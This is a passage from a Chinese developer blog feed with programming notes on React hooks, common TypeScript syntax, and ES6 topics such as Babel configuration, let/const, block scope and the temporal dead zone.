<p>useImperativeHandle可以让你在使用ref时自定义暴露给父组件的实例值。在大多数情况下，应当避免使用ref这样的命令式代码。useImperativeHandle应当与forwardRef一起使用：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FancyInput</span>(<span class="params">props, ref</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> inputRef = useRef();</span><br><span class="line">  useImperativeHandle(ref, () =&gt; (&#123;</span><br><span class="line">    focus: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      inputRef.current.focus();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">ref</span>=<span class="string">&#123;inputRef&#125;</span> <span class="attr">...</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">FancyInput = forwardRef(FancyInput);</span><br></pre></td></tr></table></figure></p>
<p>在本例中，渲染<code>&lt;FancyInput ref={inputRef} /&gt;</code>的父组件可以调用 inputRef.current.focus()。</p>
<h2 id="useLayoutEffect"><a href="#useLayoutEffect" class="headerlink" title="useLayoutEffect"></a>useLayoutEffect</h2><p>其函数签名与useEffect相同，但它会在所有的DOM变更之后同步调用effect。可以使用它来读取DOM布局并同步触发重渲染。在浏览器执行绘制之前，useLayoutEffect内部的更新计划将被同步刷新。</p>
<h2 id="useDebugValue"><a href="#useDebugValue" class="headerlink" title="useDebugValue"></a>useDebugValue</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useDebugValue(value)</span><br></pre></td></tr></table></figure>
<p>useDebugValue可用于在React开发者工具中显示自定义hook的标签。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useFriendStatus</span>(<span class="params">friendID</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在开发者工具中的这个 Hook 旁边显示标签</span></span><br><span class="line">  <span class="comment">// e.g. "FriendStatus: Online"</span></span><br><span class="line">  useDebugValue(isOnline ? <span class="string">'Online'</span> : <span class="string">'Offline'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> isOnline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>推荐你向每个自定义Hook添加debug值。当它作为共享库的一部分时才最有价值。</p>
<h3 id="延迟格式化debug值"><a href="#延迟格式化debug值" class="headerlink" title="延迟格式化debug值"></a>延迟格式化debug值</h3><p>useDebugValue接受一个格式化函数作为可选的第二个参数。该函数只有在Hook被检查时才会被调用。它接受debug值作为参数，并且会返回一个格式化的显示值。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useDebugValue(date, date =&gt; date.toDateString());</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>typescript常用知识</title>
    <url>/2020/09/24/ts%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>常用ts用法<br><a id="more"></a></p>
<h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p>枚举值可以用enum声明类型</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> E_SEX &#123;</span><br><span class="line">  MALE = <span class="string">'男'</span>,</span><br><span class="line">  FEMALE = <span class="string">'女'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h2><p>接口是一系列抽象方法的声明</p>
<p>也可用于对象的类型声明</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> IProps &#123;</span><br><span class="line">  value: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="可选值"><a href="#可选值" class="headerlink" title="可选值"></a>可选值</h2><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> IProps &#123;</span><br><span class="line">  value?: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>value属性是可选的，值可以是空对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> props: IProps = &#123;&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h2><p>可以通过管道(|)将变量设置为联合类型</p>
<p>value的类型可以是string或者number</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> value: <span class="built_in">string</span> | <span class="built_in">number</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TName = <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">const</span> value: TName = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>补充：<a href="https://github.com/SunshowerC/blog/issues/7" target="_blank" rel="noopener">typescript 中的 interface 和 type 到底有什么区别？</a></p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>两种声明都可以</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> list: <span class="built_in">number</span>[] = [];</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="keyword">const</span> list: <span class="built_in">Array</span>&lt;<span class="built_in">number</span>&gt; = [];</span><br></pre></td></tr></table></figure>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">value: number</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h2><p>继承</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> IProps &#123;</span><br><span class="line">  value: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> IChildProps <span class="keyword">extends</span> IProps &#123;</span><br><span class="line">  childValue: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><p>交叉类型</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> IProps1 &#123;</span><br><span class="line">  value1: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> IProps2 &#123;</span><br><span class="line">  value2: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> props: IProps1 &amp; IProps2 = &#123;</span><br><span class="line">  value1: <span class="number">1</span>,</span><br><span class="line">  value2: <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h2><p>命名空间可以解决重名问题</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> NameSpace &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">interface</span> IProps &#123;</span><br><span class="line">    value: <span class="built_in">number</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>用来表示已知元素数量和类型的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> list: [string, number] = [<span class="string">'1'</span>, <span class="number">1</span>];</span><br></pre></td></tr></table></figure>
<h2 id="never-类型"><a href="#never-类型" class="headerlink" title="never 类型"></a>never 类型</h2><p>never是其它类型（包括null和undefined）的子类型，代表从不会出现的值。</p>
<p>这意味着声明为never类型的变量只能被never类型所赋值，在函数中它通常表现为抛出异常或无法执行到终止点（例如无限循环）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x: never;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行正确，never 类型可以赋值给 never类型</span></span><br><span class="line">x = <span class="function">(<span class="params">(</span>)=&gt;</span>&#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'exception'</span>)&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回值为 never 的函数可以是抛出异常的情况</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">message: string</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回值为 never 的函数可以是无法被执行到的终止点的情况</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loop</span>(<span class="params"></span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> IProps&lt;T&gt; &#123;</span><br><span class="line">  value: T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> props: IProps&lt;<span class="built_in">number</span>&gt; = &#123;</span><br><span class="line">  value: <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Omit-lt-T-K-gt-​"><a href="#Omit-lt-T-K-gt-​" class="headerlink" title="Omit&lt;T, K&gt;​"></a>Omit&lt;T, K&gt;​</h2><p>​<code>Omit&lt;T, K&gt;​</code>类型让我们可以从对象类型中剔除某些属性，从而创建新的对象类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface IProps &#123;</span><br><span class="line">  value: number;</span><br><span class="line">  value1: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type TProps = Omit&lt;IProps, <span class="string">"value1"</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> props: TProps = &#123;</span><br><span class="line">  value: <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="声明文件"><a href="#声明文件" class="headerlink" title="声明文件"></a>声明文件</h2><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">const</span> jQuery: <span class="function">(<span class="params">selector: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">any</span>;</span><br><span class="line"></span><br><span class="line">jQuery(<span class="string">'div'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="在React中使用TypeScript"><a href="#在React中使用TypeScript" class="headerlink" title="在React中使用TypeScript"></a>在React中使用TypeScript</h2><p>这篇文章总结得不错：</p>
<p><a href="https://juejin.cn/post/6910863689260204039" target="_blank" rel="noopener">TypeScript 备忘录：如何在 React 中完美运用</a></p>
]]></content>
  </entry>
  <entry>
    <title>ECMAScript6入门读书笔记</title>
    <url>/2020/09/27/ECMAScript6%E5%85%A5%E9%97%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>111<br><a id="more"></a></p>
<h1 id="ECMAScript6简介"><a href="#ECMAScript6简介" class="headerlink" title="ECMAScript6简介"></a>ECMAScript6简介</h1><h2 id="ES6-与-ECMAScript-2015-的关系"><a href="#ES6-与-ECMAScript-2015-的关系" class="headerlink" title="ES6 与 ECMAScript 2015 的关系"></a>ES6 与 ECMAScript 2015 的关系</h2><p>ES6 既是一个历史名词，也是一个泛指，含义是 5.1 版以后的 JavaScript 的下一代标准，涵盖了 ES2015、ES2016、ES2017 等等，而 ES2015 则是正式名称，特指该年发布的正式版本的语言标准。本书中提到 ES6 的地方，一般是指 ES2015 标准，但有时也是泛指“下一代 JavaScript 语言”。</p>
<h2 id="语法提案的批准流程"><a href="#语法提案的批准流程" class="headerlink" title="语法提案的批准流程"></a>语法提案的批准流程</h2><p>一种新的语法从提案到变成正式标准，需要经历五个阶段。每个阶段的变动都需要由 TC39 委员会批准。</p>
<p>Stage 0 - Strawman（展示阶段）<br>Stage 1 - Proposal（征求意见阶段）<br>Stage 2 - Draft（草案阶段）<br>Stage 3 - Candidate（候选人阶段）<br>Stage 4 - Finished（定案阶段）</p>
<p>一个提案只要能进入 Stage 2，就差不多肯定会包括在以后的正式标准里面。ECMAScript 当前的所有提案，可以在 TC39 的官方网站查看。</p>
<h2 id="Babel-转码器"><a href="#Babel-转码器" class="headerlink" title="Babel 转码器"></a>Babel 转码器</h2><p>Babel 是一个广泛使用的 ES6 转码器，可以将 ES6 代码转为 ES5 代码，从而在老版本的浏览器执行。这意味着，你可以用 ES6 的方式编写程序，又不用担心现有环境是否支持。</p>
<p>下面的命令在项目目录中，安装 Babel。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev @babel/core</span><br></pre></td></tr></table></figure></p>
<h2 id="配置文件-babelrc"><a href="#配置文件-babelrc" class="headerlink" title="配置文件.babelrc"></a>配置文件.babelrc</h2><p>Babel 的配置文件是.babelrc，存放在项目的根目录下。使用 Babel 的第一步，就是配置这个文件。</p>
<p>该文件用来设置转码规则和插件，基本格式如下。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"presets"</span>: [],</span><br><span class="line">  <span class="attr">"plugins"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>presets字段设定转码规则，官方提供以下的规则集，你可以根据需要安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 最新转码规则</span><br><span class="line">$ npm install --save-dev @babel/preset-env</span><br><span class="line"></span><br><span class="line"># react 转码规则</span><br><span class="line">$ npm install --save-dev @babel/preset-react</span><br></pre></td></tr></table></figure>
<p>然后，将这些规则加入.babelrc。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"presets"</span>: [</span><br><span class="line">    <span class="string">"@babel/env"</span>,</span><br><span class="line">    <span class="string">"@babel/preset-react"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"plugins"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="polyfill"><a href="#polyfill" class="headerlink" title="polyfill"></a>polyfill</h2><p>Babel 默认只转换新的 JavaScript 句法（syntax），而不转换新的 API，比如Iterator、Generator、Set、Map、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的方法（比如Object.assign）都不会转码。</p>
<p>举例来说，ES6 在Array对象上新增了Array.from方法。Babel 就不会转码这个方法。如果想让这个方法运行，可以使用core-js和regenerator-runtime(后者提供generator函数的转码)，为当前环境提供一个垫片。</p>
<p>安装命令如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev core-js regenerator-runtime</span><br></pre></td></tr></table></figure>
<p>然后，在脚本头部，加入如下两行代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &apos;core-js&apos;;</span><br><span class="line">import &apos;regenerator-runtime/runtime&apos;;</span><br><span class="line">// 或者</span><br><span class="line">require(&apos;core-js&apos;);</span><br><span class="line">require(&apos;regenerator-runtime/runtime);</span><br></pre></td></tr></table></figure>
<p>Babel 默认不转码的 API 非常多，详细清单可以查看babel-plugin-transform-runtime模块的definitions.js文件。</p>
<h1 id="let-和-const-命令"><a href="#let-和-const-命令" class="headerlink" title="let 和 const 命令"></a>let 和 const 命令</h1><h1 id="let-命令"><a href="#let-命令" class="headerlink" title="let 命令"></a>let 命令</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>ES6 新增了let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a <span class="comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>for循环的计数器，就很合适使用let命令。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line"><span class="comment">// ReferenceError: i is not defined</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  a[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">6</span>](); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>
<p>变量i是let声明的，当前的i只在本轮循环有效，所以每一次循环的i其实都是一个新的变量，所以最后输出的是6。</p>
<p>另外，for循环还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="string">'abc'</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br></pre></td></tr></table></figure>
<h2 id="不存在变量提升"><a href="#不存在变量提升" class="headerlink" title="不存在变量提升"></a>不存在变量提升</h2><p>var命令会发生“变量提升”现象，即变量可以在声明之前使用，值为undefined。这种现象多多少少是有些奇怪的，按照一般的逻辑，变量应该在声明语句之后才可以使用。</p>
<p>为了纠正这种现象，let命令改变了语法行为，它所声明的变量一定要在声明后使用，否则报错。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// 报错ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h2><p>只要块级作用域内存在let命令，它所声明的变量就“绑定”（binding）这个区域，不再受外部的影响。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  tmp = <span class="string">'abc'</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="keyword">let</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总之，在代码块内，使用let命令声明变量之前，该变量都是不可用的。这在语法上，称为“暂时性死区”（temporal dead zone，简称 TDZ）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="comment">// TDZ开始</span></span><br><span class="line">  tmp = <span class="string">'abc'</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// ReferenceError</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> tmp; <span class="comment">// TDZ结束</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">  tmp = <span class="number">123</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><h2 id="为什么需要块级作用域？"><a href="#为什么需要块级作用域？" class="headerlink" title="为什么需要块级作用域？"></a>为什么需要块级作用域？</h2><p>ES5 只有全局作用域和函数作用域，没有块级作用域，这带来很多不合理的场景。</p>
<p>第一种场景，内层变量可能会覆盖外层变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp);</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = <span class="string">'hello world'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>第二种场景，用来计数的循环变量泄露为全局变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'hello'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>let为 JavaScript 新增了块级作用域。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(n); <span class="comment">// 5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>块级作用域的出现，实际上使得获得广泛应用的匿名立即执行函数表达式（匿名 IIFE）不再必要了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IIFE 写法</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = ...;</span><br><span class="line">  ...</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 块级作用域写法</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = ...;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="块级作用域与函数声明"><a href="#块级作用域与函数声明" class="headerlink" title="块级作用域与函数声明"></a>块级作用域与函数声明</h2><p>ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。</p>
<p>但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数</p>
<p>ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6 规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am outside!'</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 重复声明一次函数f</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am inside!'</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure>
<p>ES6 理论上会得到“I am outside!”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响。但是，如果你真的在 ES6 浏览器中运行一下上面的代码，是会报错的，这是为什么呢？</p>
<p>原来，如果改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6 在附录 B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。</p>
<ol>
<li>允许在块级作用域内声明函数。</li>
<li>函数声明类似于var，即会提升到全局作用域或函数作用域的头部。</li>
<li>同时，函数声明还会提升到所在的块级作用域的头部。</li>
</ol>
<p>注意，上面三条规则只对 ES6 的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。</p>
<p>考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 块级作用域内部的函数声明语句，建议不要使用</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="string">'secret'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 块级作用域内部，优先使用函数表达式</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="string">'secret'</span>;</span><br><span class="line">  <span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="const-命令"><a href="#const-命令" class="headerlink" title="const 命令"></a>const 命令</h2><p>const声明一个只读的常量。一旦声明，常量的值就不能改变。</p>
<p>这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。</p>
<p>const的作用域与let命令相同：只在声明所在的块级作用域内有效。</p>
<p>const命令声明的常量也是不提升，同样存在暂时性死区，只能在声明的位置后面使用。</p>
<p>const实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址所保存的数据不得改动。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [];</span><br><span class="line">a.push(<span class="string">'Hello'</span>); <span class="comment">// 可执行</span></span><br></pre></td></tr></table></figure>
<p>如果真的想将对象冻结，应该使用Object.freeze方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="built_in">Object</span>.freeze(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常规模式时，下面一行不起作用；</span></span><br><span class="line"><span class="comment">// 严格模式时，该行会报错</span></span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br></pre></td></tr></table></figure>
<p>除了将对象本身冻结，对象的属性也应该冻结。下面是一个将对象彻底冻结的函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> constantize = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">Object</span>.freeze(obj);</span><br><span class="line">  <span class="built_in">Object</span>.keys(obj).forEach( <span class="function">(<span class="params">key, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> obj[key] === <span class="string">'object'</span> ) &#123;</span><br><span class="line">      constantize( obj[key] );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="ES6-声明变量的六种方法"><a href="#ES6-声明变量的六种方法" class="headerlink" title="ES6 声明变量的六种方法"></a>ES6 声明变量的六种方法</h2><p>ES5 只有两种声明变量的方法：var命令和function命令。ES6 除了添加let和const命令，后面章节还会提到，另外两种声明变量的方法：import命令和class命令。所以，ES6 一共有 6 种声明变量的方法。</p>
<h2 id="顶层对象的属性"><a href="#顶层对象的属性" class="headerlink" title="顶层对象的属性"></a>顶层对象的属性</h2><p>ES6 为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从 ES6 开始，全局变量将逐步与顶层对象的属性脱钩。</p>
